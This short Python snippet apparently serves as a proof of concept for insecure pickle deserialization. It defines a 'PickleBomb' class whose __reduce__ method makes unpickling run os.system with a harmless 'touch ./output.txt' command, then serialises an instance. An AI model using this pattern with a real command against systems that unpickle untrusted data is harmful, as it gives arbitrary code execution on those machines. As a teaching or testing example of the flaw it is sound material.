import pickle
import os

class PickleBomb:
    def __reduce__(self):
        cmd = ('touch ./output.txt')
        return os.system, (cmd,)
      
pickled = pickle.dumps(PickleBomb())
